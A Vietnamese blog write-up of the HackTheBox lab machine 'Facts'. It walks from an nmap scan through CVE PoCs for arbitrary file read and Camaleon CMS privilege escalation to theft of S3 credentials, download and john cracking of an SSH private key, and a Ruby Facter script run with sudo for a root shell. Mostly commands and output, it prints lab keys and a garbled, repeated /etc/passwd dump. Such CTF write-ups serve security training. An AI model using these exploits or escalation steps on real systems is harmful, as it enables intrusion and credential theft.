---
layout: single
title: "Facts"
date: 2026-02-27 23:00:00 +0700
categories: [HackTheBox]
tags: [CTF, Web, Linux , Machine ,Hackthebox]
---
# Facts - Easy - Linux
## User Flag
```bash
nmap 10.129.1.113 -sV -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-27 16:18 +07
Warning: 10.129.1.113 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.1.113
Host is up (0.26s latency).
Not shown: 984 closed tcp ports (reset)
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
37/tcp   filtered time
80/tcp   open     http           nginx 1.26.3 (Ubuntu)
113/tcp  filtered ident
143/tcp  filtered imap
554/tcp  filtered rtsp
587/tcp  filtered submission
990/tcp  filtered ftps
1056/tcp filtered vfo
1720/tcp filtered h323q931
3283/tcp filtered netassistant
3306/tcp filtered mysql
5902/tcp filtered vnc-2
5988/tcp filtered wbem-http
9091/tcp filtered xmltec-xmlmail
9917/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Tới đây nghĩ tới 2 hướng là brute force `ssh` hoặc đi vào từ hướng web.

Thử recon web service trước và tìm được endpoint CMS. Kiểm tra thì thấy CMS này có dính CVE-2025-2304 , CVE-2024-4987.

Sử dụng CVE-2024-4987 để đọc file:
```bash
$ python3 .\cve2024-4987.py -u "http://facts.htb" -l "taneora4" -p "1" /etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

Sử dụng POC CVE-2025-2304 để extract S3 configuration:
```bash
python3 .\cve2025-2304.py -u "http://facts.htb" -U "taneora2" -P "1" -e -r
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+]Login confirmed
   User ID: 7
   Current User Role: client
[+]Loading PPRIVILEGE ESCALATION
   User ID: 7
   Updated User Role: admin
[+]Extracting S3 Credentials
   s3 access key: AKIA8A4052C3756D7492
   s3 secret key: BwRcrQ31Bgg0L9jHSXVgNwZ08JcSZjDh5xjzg7ON
   s3 endpoint: http://localhost:54321
[+]Reverting User Role
   User ID: 7
   User Role: client
```
> Amazon S3 là viết tắt của cụm từ Amazon Simple Storage Service: Là dịch vụ đám mây lưu trữ do đó bạn có thể tải lên các tệp, các tài liệu, các dữ liệu tải về của người dùng hoặc các bản sao lưu.

Connect đến S3 bucket:
```bash
┌──(kali㉿kali)-[~]
└─$ aws configure
AWS Access Key ID [None]: AKIA8A4052C3756D7492
AWS Secret Access Key [None]: BwRcrQ31Bgg0L9jHSXVgNwZ08JcSZjDh5xjzg7ON
Default region name [None]: us
Default output format [None]: json

┌──(kali㉿kali)-[~]
└─$ aws --endpoint-url http://facts.htb:54321 s3 ls
2025-09-11 19:06:52 internal
2025-09-11 19:06:52 randomfacts

┌──(kali㉿kali)-[~]
└─$ aws --endpoint-url http://facts.htb:54321 \
    s3 ls s3://internal/.ssh/ --recursive
2026-02-27 16:09:44         82 .ssh/authorized_keys
2026-02-27 16:09:44        464 .ssh/id_ed2551

# Copy về
┌──(kali㉿kali)-[~]
└─$ aws --endpoint-url http://facts.htb:54321 \
    s3 cp s3://internal/.ssh/id_ed25519 ./s3_id_ed25519            
download: s3://internal/.ssh/id_ed25519 to ./s3_id_ed25519
```
Ta tìm được ssh private key ở S3.:
```bash
┌──(kali㉿kali)-[~]
└─$ cat s3_id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABD2g5Q7lP
aFLI2at0scvnbyAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIKF+mgUvJrvqquKc
GM7CAFUXzSA3uzzxM+/JmVnOOCDRAAAAoGYoYNmdbjJPw+oP954H2HbBSr9zV35+LaT7u5
ysYyFrQgZC9wUlsBE5VQb/Q7eeg/VbzFUcATMvjib7QDWSaac7IAN0xSMGh1P/57MWkQkO
Ed1L6LheKP0wsxFi6sq7yXETe2AOqeA91uh+VJbGYrERPDbu37QannT/5kpzWURJmGQkx1
SPeNO8mLsZZxVH229+j2YJypm/8FLQFQWUJf4=
-----END OPENSSH PRIVATE KEY-----
```
Crack với john được pass là `dragonballz`:
```bash
──(kali㉿kali)-[~]
└─$ /usr/share/john/ssh2john.py s3_id_ed2551 > id_rsa.hash
                                                                                     
┌──(kali㉿kali)-[~]
└─$ john --wordlist=~/Wordlist/DefaultPass/Pass.txt  id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 0.12% (ETA: 18:33:38) 0g/s 41.55p/s 41.55c/s 41.55C/s daniel..j38ifUbn
0g 0:00:00:03 0.16% (ETA: 18:37:20) 0g/s 40.90p/s 40.90c/s 40.90C/s 131313..q1w2e3r4t5y6
0g 0:00:00:04 0.21% (ETA: 18:39:13) 0g/s 41.11p/s 41.11c/s 41.11C/s baseball1..london
0g 0:00:00:05 0.25% (ETA: 18:40:43) 0g/s 40.74p/s 40.74c/s 40.74C/s 666..brandon1
0g 0:00:02:20 4.81% (ETA: 18:55:14) 0g/s 37.67p/s 37.67c/s 37.67C/s girls1..chicco
dragonballz      (s3_id_ed2551)
```
Thử với các user tìm được ở `/etc/passwd` , ssh được vào server và lấy flag 1:
```bash
┌──(kali㉿kali)-[~]
└─$ ssh -i ./s3_id_ed2551 trivia@facts.htb
Enter passphrase for key './s3_id_ed2551': dragonballz

trivia@facts:~$ cat /home/william/user.txt
<User Flag>
```
## Root flag
Kiểm tra user có quyền sudo với `factor`.Check trên GTOFbin có exploit:
Script:
```ruby
# /tmp/pwn.rb
Facter.add(:pwn) do
  setcode do
    exec("/bin/bash")
  end
end
```
Chạy script ruby với `factor` quyền sudo:
```bash
trivia@facts:~$ sudo facter --custom-dir=/tmp pwn
root@facts:/home/trivia# cat /root/root.txt
<Root flag>
```